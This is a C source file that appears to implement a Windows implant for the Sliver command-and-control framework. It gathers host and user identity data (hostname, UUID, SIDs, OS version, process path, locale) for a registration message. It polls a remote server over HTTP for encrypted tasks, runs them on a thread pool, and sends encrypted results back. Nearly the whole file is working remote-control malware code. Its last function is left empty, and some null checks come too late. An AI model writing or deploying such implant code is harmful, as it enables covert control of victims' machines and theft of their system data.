#include "pch.h"

VOID FreeEnvelope
(
	_In_ PENVELOPE pEnvelope
)
{
	if (pEnvelope != NULL) {
		if (pEnvelope->pData != NULL) {
			if (pEnvelope->pData->pBuffer != NULL) {
				FREE(pEnvelope->pData->pBuffer);
			}

			FREE(pEnvelope->pData);
		}

		FREE(pEnvelope);
	}
}

VOID FreeSliverThreadPool
(
	_In_ PSLIVER_THREADPOOL pSliverPool
)
{
	if (pSliverPool != NULL) {
		if (pSliverPool->pPool != NULL) {
			CloseThreadpool(pSliverPool->pPool);
		}

		FREE(pSliverPool);
	}
}

PSLIVER_THREADPOOL InitializeSliverThreadPool()
{
	PSLIVER_THREADPOOL pResult = NULL;
	PTP_CLEANUP_GROUP pCleanupGroup = NULL;

	pResult = ALLOC(sizeof(SLIVER_THREADPOOL));
	pResult->pPool = CreateThreadpool(NULL);
	SetThreadpoolThreadMaximum(pResult->pPool, 8);
	SetThreadpoolCallbackPool(&pResult->CallBackEnviron, pResult->pPool);
	pCleanupGroup = CreateThreadpoolCleanupGroup();
	SetThreadpoolCallbackCleanupGroup(&pResult->CallBackEnviron, pCleanupGroup, NULL);

	return pResult;
}

PBYTE RegisterSliver
(
	_In_ PSLIVER_HTTP_CLIENT pSliverClient,
	_In_ PDWORD pcbOutput
)
{
	LPSTR lpUUID = NULL;
	LPSTR lpFullQualifiedName = NULL;
	LPSTR lpUserSid = NULL;
	LPSTR lpGroupSid = NULL;
	SYSTEM_INFO SystemInfo;
	RTL_OSVERSIONINFOW OsVersion;
	LPSTR lpVersion = NULL;
	LPSTR lpHostName = NULL;
	LPSTR lpArch = NULL;
	LPSTR lpModulePath = NULL;
	DWORD cbModulePath = MAX_PATH;
	DWORD dwReturnedLength = 0;
	DWORD dwLastError = 0;
	LPSTR lpLocaleName = NULL;
	WCHAR wszLocale[0x20];
	PBYTE pResult = NULL;
	DWORD cbResult = 1;
	CHAR szOsName[] = "windows";

	PPBElement pFinalElement = NULL;
	PPBElement ElementList[17];

	lpUUID = GetHostUUID();
	if (lpUUID == NULL) {
		goto CLEANUP;
	}

	lpUUID[lstrlenA(lpUUID) - 1] = '\0';
	lpFullQualifiedName = GetComputerUserName();
	if (lpFullQualifiedName == NULL) {
		goto CLEANUP;
	}

	lpUserSid = GetCurrentProcessUserSID();
	if (lpUserSid == NULL) {
		goto CLEANUP;
	}

	lpGroupSid = GetCurrentProcessGroupSID();
	if (lpGroupSid == NULL) {
		goto CLEANUP;
	}

	SecureZeroMemory(&OsVersion, sizeof(OsVersion));
	OsVersion.dwOSVersionInfoSize = sizeof(OsVersion);
	if (!GetOsVersion(&OsVersion)) {
		LogError(L"ConvertSidToStringSidA failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
		goto CLEANUP;
	}

	SecureZeroMemory(&SystemInfo, sizeof(SystemInfo));
	GetNativeSystemInfo(&SystemInfo);
	lpVersion = ALLOC(0x100);
	sprintf_s(lpVersion, 0x100, "%d build %d", OsVersion.dwMajorVersion, OsVersion.dwBuildNumber);
	if (SystemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) {
		lstrcatA(lpVersion, " x86_64");
		lpArch = DuplicateStrA("amd64", 0);
	}
	else if (SystemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL) {
		lstrcatA(lpVersion, " x86");
		lpArch = DuplicateStrA("386", 0);
	}
	else {
		lpArch = DuplicateStrA("(NULL)", 0);
	}

	lpHostName = GetHostName();
	lpModulePath = ALLOC(cbModulePath + 1);
	while (TRUE) {
		SecureZeroMemory(lpModulePath, cbModulePath + 1);
		dwReturnedLength = GetModuleFileNameA(NULL, lpModulePath, cbModulePath);
		dwLastError = GetLastError();
		if (dwLastError == ERROR_INSUFFICIENT_BUFFER) {
			cbModulePath *= 2;
			lpModulePath = REALLOC(lpModulePath, cbModulePath + 1);
		}

		break;
	}

	GetSystemDefaultLocaleName(wszLocale, 0x20);
	lpLocaleName = ConvertWcharToChar(wszLocale);

	SecureZeroMemory(ElementList, sizeof(ElementList));
	ElementList[0] = CreateBytesElement(pSliverClient->szSliverName, lstrlenA(pSliverClient->szSliverName), 1);
	ElementList[1] = CreateBytesElement(lpHostName, lstrlenA(lpHostName), 2);
	ElementList[2] = CreateBytesElement(lpUUID + 1, lstrlenA(lpUUID + 1), 3);
	ElementList[3] = CreateBytesElement(lpFullQualifiedName, lstrlenA(lpFullQualifiedName), 4);
	ElementList[4] = CreateBytesElement(lpUserSid, lstrlenA(lpUserSid), 5);
	ElementList[5] = CreateBytesElement(lpGroupSid, lstrlenA(lpGroupSid), 6);
	ElementList[6] = CreateBytesElement(szOsName, lstrlenA(szOsName), 7);
	ElementList[7] = CreateBytesElement(lpArch, lstrlenA(lpArch), 8);
	ElementList[8] = CreateVarIntElement(GetCurrentProcessId(), 9);
	ElementList[9] = CreateBytesElement(lpModulePath, lstrlenA(lpModulePath), 10);
	ElementList[10] = CreateBytesElement(pSliverClient->lpHostName, lstrlenA(pSliverClient->lpHostName), 11);
	ElementList[11] = CreateBytesElement(lpVersion, lstrlenA(lpVersion), 12);
	ElementList[12] = CreateVarIntElement(pSliverClient->uReconnectInterval, 13);
	if (pSliverClient->HttpConfig.pProxyConfig != NULL && pSliverClient->HttpConfig.pProxyConfig->pUri != NULL) {
		ElementList[13] = CreateBytesElement(pSliverClient->HttpConfig.pProxyConfig->pUri, lstrlenA(pSliverClient->HttpConfig.pProxyConfig->pUri), 14);
	}

	ElementList[14] = CreateBytesElement(pSliverClient->szConfigID, lstrlenA(pSliverClient->szConfigID), 16);
	ElementList[15] = CreateVarIntElement(pSliverClient->uPeerID, 17);
	ElementList[16] = CreateBytesElement(lpLocaleName, lstrlenA(lpLocaleName), 18);

	pFinalElement = CreateStructElement(ElementList, _countof(ElementList), 0);
	pResult = ALLOC(pFinalElement->cbMarshalledData);
	memcpy(pResult, pFinalElement->pMarshalledData, pFinalElement->cbMarshalledData);
	if (pcbOutput != NULL) {
		*pcbOutput = pFinalElement->cbMarshalledData;
	}
CLEANUP:
	if (lpHostName != NULL) {
		FREE(lpHostName);
	}

	if (lpUUID != NULL) {
		FREE(lpUUID);
	}

	if (lpFullQualifiedName != NULL) {
		FREE(lpFullQualifiedName);
	}

	if (lpUserSid != NULL) {
		FREE(lpUserSid);
	}

	if (lpGroupSid != NULL) {
		FREE(lpGroupSid);
	}

	if (lpArch != NULL) {
		FREE(lpArch);
	}

	if (lpModulePath != NULL) {
		FREE(lpModulePath);
	}

	if (lpVersion != NULL) {
		FREE(lpVersion);
	}

	if (lpLocaleName != NULL) {
		FREE(lpLocaleName);
	}

	FreeElement(pFinalElement);

	return pResult;
}

PBUFFER MarshalEnvelope
(
	_In_ PENVELOPE pEnvelope
)
{
	PPBElement ElementList[4];
	DWORD i = 0;
	PBUFFER pResult = NULL;
	PPBElement pTemp = NULL;

	SecureZeroMemory(ElementList, sizeof(ElementList));
	if (pEnvelope->uID != 0) {
		ElementList[0] = CreateVarIntElement(pEnvelope->uID, 1);
	}

	if (pEnvelope->uType > 0) {
		ElementList[1] = CreateVarIntElement(pEnvelope->uType, 2);
	}

	if (!pEnvelope->uUnknownMessageType) {
		ElementList[2] = CreateBytesElement(pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, 3);
	}
	else {
		ElementList[3] = CreateVarIntElement(TRUE, 4);
	}

	pResult = ALLOC(sizeof(BUFFER));
	pTemp = CreateStructElement(ElementList, 4, 0);
	if (pTemp->SubElements != NULL) {
		for (i = 0; i < pTemp->dwNumberOfSubElement; i++) {
			FreeElement(pTemp->SubElements[i]);
		}

		FREE(pTemp->SubElements);
	}

	pResult->pBuffer = pTemp->pMarshalledData;
	pResult->cbBuffer = pTemp->cbMarshalledData;
	FREE(pTemp);
	return pResult;
}

PENVELOPE UnmarshalEnvelope
(
	_In_ PBYTE pInput,
	_In_ DWORD cbInput
)
{
	PPBElement ElementList[4];
	DWORD i = 0;
	PENVELOPE pResult = NULL;

	SecureZeroMemory(ElementList, sizeof(ElementList));
	for (i = 0; i < _countof(ElementList); i++) {
		ElementList[i] = ALLOC(sizeof(PBElement));
		ElementList[i]->dwFieldIdx = i + 1;
	}

	ElementList[0]->Type = Varint;
	ElementList[1]->Type = Varint;
	ElementList[2]->Type = Bytes;
	ElementList[3]->Type = Varint;

	pResult = UnmarshalStruct(ElementList, _countof(ElementList), pInput, cbInput, NULL);
	for (i = 0; i < _countof(ElementList); i++) {
		FREE(ElementList[i]);
	}

	return pResult;
}

VOID SessionMainLoop
(
	_In_ PSLIVER_HTTP_CLIENT pSliverClient
)
{
	PENVELOPE pEnvelope = NULL;
	PSLIVER_THREADPOOL pSliverPool = NULL;
	PTP_WORK pWork = NULL;
	PENVELOPE_WRAPPER pWrapper = NULL;

	pSliverPool = InitializeSliverThreadPool();
	if (pSliverPool == NULL) {
		goto CLEANUP;
	}

	pSliverClient->dwPollTimeout = 30;
	while (TRUE) {
		pSliverClient->HttpConfig.dwSendTimeout = pSliverClient->dwPollTimeout * 1000;
		pEnvelope = ReadEnvelope(pSliverClient);
		if (pEnvelope == NULL) {
			Sleep(pSliverClient->dwPollInterval * 1000);
			continue;
		}

		wprintf(L"Receive Envelope:\n");
		HexDump(pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer);
		pWrapper = ALLOC(sizeof(ENVELOPE_WRAPPER));
		pWrapper->pSliverClient = pSliverClient;
		pWrapper->pEnvelope = pEnvelope;
		pWork = CreateThreadpoolWork(MainHandler, pWrapper, &pSliverPool->CallBackEnviron);
		if (pWork == NULL) {
			LogError(L"CreateThreadpoolWork failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
			goto CLEANUP;
		}

		SubmitThreadpoolWork(pWork);
		Sleep(pSliverClient->dwPollInterval * 1000);
	}

CLEANUP:
	FreeSliverThreadPool(pSliverPool);

	return;
}

BOOL WriteEnvelope
(
	_In_ PSLIVER_HTTP_CLIENT pSliverClient,
	_In_ PENVELOPE pEnvelope
)
{
	PBUFFER pMarshalledEnvelope = NULL;
	DWORD cbCipherText = 0;
	PBYTE pCipherText = NULL;
	LPSTR lpEncodedData = NULL;
	LPSTR lpUri = NULL;
	PURI pUri = NULL;
	PHTTP_RESP pResp = NULL;
	BOOL Result = FALSE;

	pMarshalledEnvelope = MarshalEnvelope(pEnvelope);
	pCipherText = SessionEncrypt(pSliverClient, pMarshalledEnvelope->pBuffer, pMarshalledEnvelope->cbBuffer, &cbCipherText);
	
	lpUri = CreateSessionURL(pSliverClient);
	if (lpUri == NULL) {
		goto CLEANUP;
	}

	pUri = UriInit(lpUri);
	if (pUri == NULL) {
		goto CLEANUP;
	}

	lpEncodedData = SliverBase64Encode(pCipherText, cbCipherText);
	pResp = SendHttpRequest(&pSliverClient->HttpConfig, pSliverClient->pHttpClient, pUri->lpPathWithQuery, POST, NULL, lpEncodedData, lstrlenA(lpEncodedData), FALSE, FALSE);
	if (pResp == NULL || (pResp->dwStatusCode != HTTP_STATUS_OK && pResp->dwStatusCode != HTTP_STATUS_ACCEPTED)) {
		goto CLEANUP;
	}

	Result = TRUE;
CLEANUP:
	if (lpUri != NULL) {
		FREE(lpUri);
	}

	if (lpEncodedData != NULL) {
		FREE(lpEncodedData);
	}

	if (pCipherText != NULL) {
		FREE(pCipherText);
	}

	FreeUri(pUri);
	FreeBuffer(pMarshalledEnvelope);
	FreeHttpResp(pResp);

	return Result;
}

PENVELOPE ReadEnvelope
(
	_In_ PSLIVER_HTTP_CLIENT pSliverClient
)
{
	LPSTR lpUri = NULL;
	PHTTP_RESP pResp = NULL;
	PURI pUri = NULL;
	PENVELOPE pResult = NULL;
	PBYTE pDecodedData = NULL;
	DWORD cbDecodedData = 0;
	PBYTE pPlainText = NULL;
	DWORD cbPlainText = 0;

	lpUri = CreatePollURL(pSliverClient);
	if (lpUri == NULL) {
		goto CLEANUP;
	}

	pUri = UriInit(lpUri);
	pResp = SendHttpRequest(&pSliverClient->HttpConfig, pSliverClient->pHttpClient, pUri->lpPathWithQuery, GET, NULL, NULL, 0, FALSE, TRUE);
	if (pResp->dwStatusCode == HTTP_STATUS_NO_CONTENT) {
		goto CLEANUP;
	}

	if (pResp == NULL || pResp->pRespData == NULL || pResp->cbResp == 0 || pResp->dwStatusCode != HTTP_STATUS_OK) {
		goto CLEANUP;
	}

	pDecodedData = SliverBase64Decode(pResp->pRespData, &cbDecodedData);
	pPlainText = SessionDecrypt(pSliverClient, pDecodedData, cbDecodedData, &cbPlainText);
	pResult = UnmarshalEnvelope(pPlainText, cbPlainText);
CLEANUP:
	if (lpUri != NULL) {
		FREE(lpUri);
	}

	if (pPlainText != NULL) {
		FREE(pPlainText);
	}

	if (pDecodedData != NULL) {
		FREE(pDecodedData);
	}

	FreeUri(pUri);
	FreeHttpResp(pResp);
	return pResult;
}

PSLIVER_REQ UnmarshalSliverReq
(
	_In_ PBYTE pInput,
	_In_ DWORD cbInput
)
{
	PPBElement ElementList[4];
	DWORD i = 0;
	PSLIVER_REQ pResult = NULL;
	LPVOID* pTemp = NULL;

	SecureZeroMemory(ElementList, sizeof(PPBElement));
	for (i = 0; i < _countof(ElementList); i++) {
		ElementList[i] = ALLOC(sizeof(PBElement));
	}

	ElementList[0]->dwFieldIdx = 1;
	ElementList[1]->dwFieldIdx = 2;
	ElementList[2]->dwFieldIdx = 8;
	ElementList[3]->dwFieldIdx = 9;

	ElementList[0]->Type = Varint;
	ElementList[1]->Type = Varint;
	ElementList[2]->Type = Bytes;
	ElementList[3]->Type = Bytes;

	pTemp = UnmarshalStruct(ElementList, _countof(ElementList), pInput, cbInput, NULL);
	pResult = ALLOC(sizeof(SLIVER_REQ));
	if (pTemp[0] != NULL) {
		pResult->Async = TRUE;
	}

	pResult->uTimeout = pTemp[1];
	if (pTemp[2] != NULL) {
		memcpy(pResult->szBeaconID, ((PBUFFER)(pTemp[2]))->pBuffer, ((PBUFFER)(pTemp[2]))->cbBuffer);
	}

	if (pTemp[3] != NULL) {
		memcpy(pResult->szSessionID, ((PBUFFER)(pTemp[3]))->pBuffer, ((PBUFFER)(pTemp[3]))->cbBuffer);
	}

	return pResult;
}

PBUFFER MarshalSliverReq
(
	_In_ PSLIVER_REQ pSliverReq
)
{

}